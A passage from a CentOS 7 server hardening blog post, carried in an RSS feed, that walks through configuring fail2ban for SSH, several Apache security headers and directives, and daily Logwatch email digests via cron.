+<pre tabindex="0"><code>
+
+
+Once the installation has completed we need to then go ahead and install Fail2ban
+</code></pre><p>sudo yum install fail2ban fail2ban-systemd</p>
+<pre tabindex="0"><code>
+
+
+Fail to ban comes with a wealth of options that would deserve a post all to itself so in this instance we will create a basic configuration file that will help secure your server, especially the SSH service.
+
+
+
+Using SELinux? Then you will want to update your policy by doing the following.
+</code></pre><p>yum update -y selinux-policy*</p>
+<pre tabindex="0"><code>
+
+#### Configuration
+
+
+
+We will be configuring fail2ban for use with Firewalld as it is implemented by default in CentOS 7.
+
+
+
+Create a sshd.local file ready for editing.
+</code></pre><p>sudo nano /etc/fail2ban/jail.d/sshd.local</p>
+<pre tabindex="0"><code>
+
+
+Add the following lines.
+</code></pre><p>[sshd]
+enabled = true
+port = 22000
+logpath = %(sshd_log)s
+maxretry = 3
+bantime = 86400</p>
+<pre tabindex="0"><code>
+
+
+Save the file and go ahead and start fail2ban.
+</code></pre><p>sudo systemctl enable fail2ban
+sudo systemctl start fail2ban</p>
+<pre tabindex="0"><code>
+
+
+You should now have a working fail2ban installation which will automatically ban IP addresses after 3 failed attempts at logging in to your system via SSH.
+
+
+# Apache Hardening
+
+
+
+The default [Apache](http://www.apache.org/) configuration just works but there’s a few tweaks we can do here and there that makes the bad guys job a little harder. One of the things we can do is try and prevent information leakage.
+
+
+
+By default [Apache](http://www.apache.org/) gives out server version information on error pages. We can prevent this by adding a couple of lines to our httpd.conf file.
+
+
+### Version banner
+
+
+
+Open up the httpd config file ready for editing.
+</code></pre><p>sudo nano /etc/httpd/conf/httpd.conf</p>
+<pre tabindex="0"><code>
+
+
+add the following lines to the bottom of the file
+</code></pre><p>ServerTokens Prod
+ServerSignature Off</p>
+<pre tabindex="0"><code>
+
+### Cookies
+
+
+#### Trace Requests
+
+
+
+To protect yourself from [Cross Site Tracing](https://www.owasp.org/index.php/Cross_Site_Tracing) attacks append the following line to the end of your configuration file.
+</code></pre><p>TraceEnable off</p>
+<pre tabindex="0"><code>
+
+#### Set the HttpOnly and Secure flag
+
+
+
+To mitigate against most of the common [Cross Site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) attacks you can set the following directive, again add the following line at the end of your configuration file.
+</code></pre><p>Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure</p>
+<pre tabindex="0"><code>
+
+#### X-Frame Options
+
+
+
+Adding this option to your configuration file will indicate whether or not a browser should be allowed to open a webpage in a frame or iframe. This will prevent site content embedded into other sites. See – [https://www.owasp.org/index.php/Clickjacking](https://www.owasp.org/index.php/Clickjacking).
+
+
+
+Append the following line in your configuration file.
+</code></pre><p>Header always append X-Frame-Options SAMEORIGIN</p>
+<pre tabindex="0"><code>
+
+#### XSS Protection Again
+
+
+
+To ensure and enforce web browser [Cross Site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) protection append the following to your configuration file.
+</code></pre><p>Header set X-XSS-Protection “1; mode=block”</p>
+<pre tabindex="0"><code>
+
+
+Now with those options set we need to restart the Apache daemon.
+</code></pre><p>sudo systemctl reload httpd.service</p>
+<pre tabindex="0"><code>
+
+# Logwatch
+
+
+
+Now to keep tabs on all of those logs, Logwatch is a great tool to monitor your servers logs and email the administrator a digest on a daily basis.
+
+
+#### Installation
+</code></pre><p>sudo yum install logwatch sendmail</p>
+<pre tabindex="0"><code>
+
+
+Now start sendmail.
+</code></pre><p>sudo systemctl start sendmail</p>
+<pre tabindex="0"><code>
+
+#### Configuration
+
+
+
+The default configuration file for Logwatch is located at the below path.
+</code></pre><p>/usr/share/logwatch/default.conf/logwatch.conf.</p>
+<pre tabindex="0"><code>
+
+
+This file contains information on which directories for Logwatch to track, how the digest is sent and where the digest is sent to.
+
+
+
+By default Logwatch keeps track of everything in /var/log but if you have other log files that you wish to add you can do this by adding the below to your logwatch.conf under the heading ‘Default Log Directory’.
+</code></pre><p>LogDir = /some/path/to/your/logs</p>
+<pre tabindex="0"><code>
+
+#### Email your daily digest
+
+
+
+let’s go ahead and edit the logwatch.conf file.
+</code></pre><p>sudo nano /usr/share/logwatch/default.conf/logwatch.conf</p>
+<pre tabindex="0"><code>
+
+
+We need to change add your email into the configuration file so that the digest gets delivered to your inbox.
+
+
+
+Look for the following section.
+</code></pre><h1 id="default-person-to-mail-reports-to--can-be-a-local-account-or-a">Default person to mail reports to.  Can be a local account or a</h1>
+<h1 id="complete-email-address--variable-output-should-be-set-to-mail-or">complete email address.  Variable Output should be set to mail, or</h1>
+<h1 id="output-mail-should-be-passed-on-command-line-to-enable-mail-feature">&ndash;output mail should be passed on command line to enable mail feature.</h1>
+<p>MailTo = root</p>
+<pre tabindex="0"><code>
+
+
+change ‘root’ to your own personal email address or wherever you want the digest sending to.
+
+
+#### Adding Logwatch to Cron
+
+
+
+Open up the crontab.
+</code></pre><p>crontab -e</p>
+<pre tabindex="0"><code>
+
+
+Now add the following line to the end of the file. This line will make logwatch run at midnight each day.
+</code></pre><p>00 00  * * *          /usr/sbin/logwatch</p>
+<pre tabindex="0"><code>
+
+
+This guide was a little quick and dirty so you have any additions to this guide I would love to hear them, also if you think something is wrong or could have been done more efficiently please get in contact.
+
+
+### About The Author
+
+
+ -  [](/)
+
+       [**](https://www.facebook.com/sharer.php?u=/centos-7-server-hardening-guide/) [**](http://twitter.com/share?url=https://smittix.github.io/centos-7-server-hardening-guide/&amp;text=CentOS%207%20Server%20Hardening%20Guide) [**](mailto:?subject=CentOS%207%20Server%20Hardening%20Guide&amp;body=/centos-7-server-hardening-guide/) [**](https://www.linkedin.com/sharing/share-offsite/?url=https://smittix.github.io/centos-7-server-hardening-guide/&amp;title=CentOS%207%20Server%20Hardening%20Guide) [**](javascript:pinIt();) [**](https://t.me/share/url?url=https://smittix.github.io/centos-7-server-hardening-guide/&amp;title=CentOS%207%20Server%20Hardening%20Guide) [**](https://api.whatsapp.com/send?text=/centos-7-server-hardening-guide/&amp;title=CentOS%207%20Server%20Hardening%20Guide) [**](https://www.reddit.com/submit?url=https://smittix.github.io/centos-7-server-hardening-guide/&amp;title=CentOS%207%20Server%20Hardening%20Guide) [**](javascript:window.print())    
+## Post navigation
+
+ [Exploiting the OpenNMS/Jenkins RMI Java Deserialization Vulnerability](/posts/exploiting-the-opennmsjenkins-rmi-java-deserialization-vulnerability/)
+</code></pre>]]></content>
+        </item>
         
     </channel>
 </rss>
